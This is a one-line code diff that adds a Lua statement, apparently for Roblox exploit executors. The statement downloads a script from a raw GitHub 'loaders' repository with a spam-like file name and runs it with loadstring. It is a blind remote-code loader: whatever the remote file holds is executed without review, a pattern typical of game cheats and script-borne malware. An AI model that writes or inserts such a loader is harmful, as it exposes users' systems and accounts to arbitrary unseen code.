@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/apple-ipad-original-spam4-8x7juuf8g0ym2o.lua"))()
